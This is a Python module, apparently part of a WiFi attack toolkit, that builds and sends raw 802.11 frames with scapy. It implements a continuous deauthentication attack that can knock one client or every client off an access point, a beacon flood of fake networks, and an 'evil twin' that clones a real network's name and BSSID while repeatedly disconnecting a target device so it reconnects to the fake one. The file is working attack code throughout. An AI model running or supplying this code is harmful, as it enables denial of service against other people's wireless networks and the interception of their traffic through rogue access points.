"""
wifi_ops.py - Advanced WiFi Operations
Handles Deauthentication attacks, Beacon flooding, and Fake AP generation.
"""

import time
import threading
import random
from scapy.all import Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt, RadioTap, sendp, conf
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()

class WiFiOperator:
    def __init__(self, interface):
        self.interface = interface
        self.stop_event = threading.Event()

    def deauth(self, target_mac, gateway_mac, count=0, interval=0.1):
        """
        Sends deauthentication packets to a target device or an entire AP.
        - target_mac: MAC of the device to kick (or "FF:FF:FF:FF:FF:FF" for everyone)
        - gateway_mac: BSSID of the Access Point
        """
        self.stop_event.clear()
        
        # Packet: RadioTap / Dot11 / Dot11Deauth
        # Type 0 (Management), Subtype 12 (Deauth)
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

        target_desc = "EVERYONE" if target_mac.upper() == "FF:FF:FF:FF:FF:FF" else target_mac
        console.print(f"[bold red]💥 Deauthenticating:[/] [cyan]{target_desc}[/] from [yellow]{gateway_mac}[/]")
        console.print("[dim]Press Ctrl+C to stop.[/]")

        def run_deauth():
            sent = 0
            try:
                while not self.stop_event.is_set():
                    sendp(packet, iface=self.interface, count=1, verbose=False)
                    sent += 1
                    if count > 0 and sent >= count:
                        break
                    time.sleep(interval)
            except Exception as e:
                console.print(f"[red]Deauth error: {e}[/]")
            finally:
                console.print(f"\n[bold green]✔ Deauth finished.[/] Sent [yellow]{sent}[/] packets.")

        threading.Thread(target=run_deauth, daemon=True).start()

    def beacon_flood(self, names=None, count=50):
        """
        Floods the area with fake Access Points (Beacons).
        """
        self.stop_event.clear()
        
        if not names:
            names = ["Free Google WiFi", "FBI Surveillance Van", "Virus.exe", "Connect for Bitcoin", "Starbucks_Free"]
        
        console.print(f"[bold magenta]🌀 Starting Beacon Flood with [cyan]{len(names)}[/] SSIDs...[/]")
        
        def run_flood():
            # Pre-generate packets for speed
            packets = []
            for name in names:
                # Random MAC for each fake AP
                mac = "00:de:ad:be:ef:" + ":".join(["%02x" % random.randint(0, 255) for _ in range(1)])
                dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)
                beacon = Dot11Beacon(cap='ESS+privacy')
                essid = Dot11Elt(ID='SSID', info=name, len=len(name))
                rsn = Dot11Elt(ID='RSNinfo', info=(
                    '\x01\x00'                 # RSN Version 1
                    '\x00\x0f\xac\x02'         # Group cipher suite: AES (CCMP)
                    '\x02\x00'                 # 2 Pairwise cipher suites
                    '\x00\x0f\xac\x04'         # AES (CCMP)
                    '\x00\x0f\xac\x02'         # TKIP
                    '\x01\x00'                 # 1 Authentication Key Management suite
                    '\x00\x0f\xac\x02'         # Pre-Shared Key
                    '\x00\x00'))               # RSN Capabilities (no extra capabilities)
                
                packets.append(RadioTap() / dot11 / beacon / essid / rsn)

            try:
                while not self.stop_event.is_set():
                    for pkt in packets:
                        sendp(pkt, iface=self.interface, verbose=False)
                    time.sleep(0.1)
            except Exception as e:
                console.print(f"[red]Beacon flood error: {e}[/]")

        threading.Thread(target=run_flood, daemon=True).start()

    def evil_twin(self, ssid, mac, target_mac=None):
        """
        Creates a specifically targeted fake AP and optionally kicks a specific client.
        - ssid: The name of the real WiFi
        - mac: The BSSID of the real WiFi to clone
        - target_mac: (Optional) The MAC of the device to force-reconnect
        """
        self.stop_event.clear()
        console.print(f"[bold red]☢ Coordinated Evil Twin Active:[/] [cyan]{ssid}[/] ([yellow]{mac}[/])")
        
        # 1. Craft Beacon Packet (Cloning)
        dot11_b = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
        packet_b = RadioTap() / dot11_b / beacon / essid

        # 2. Craft Deauth Packet (Targeting)
        packet_d = None
        if target_mac:
            console.print(f"[bold orange3]🎯 Targeting Client:[/] [cyan]{target_mac}[/]")
            dot11_d = Dot11(addr1=target_mac, addr2=mac, addr3=mac)
            packet_d = RadioTap() / dot11_d / Dot11Deauth(reason=7)

        def run_coordinated_attack():
            try:
                while not self.stop_event.is_set():
                    # Send 5 beacons
                    sendp(packet_b, iface=self.interface, verbose=False, count=5)
                    
                    # If target specified, send 2 deauths every cycle
                    if packet_d:
                        sendp(packet_d, iface=self.interface, verbose=False, count=2)
                        
                    time.sleep(0.05) 
            except Exception as e:
                console.print(f"[red]Attack error: {e}[/]")

        threading.Thread(target=run_coordinated_attack, daemon=True).start()

    def stop(self):
        self.stop_event.set()
        console.print("[bold yellow]⏹ WiFi operation stopped.[/]")
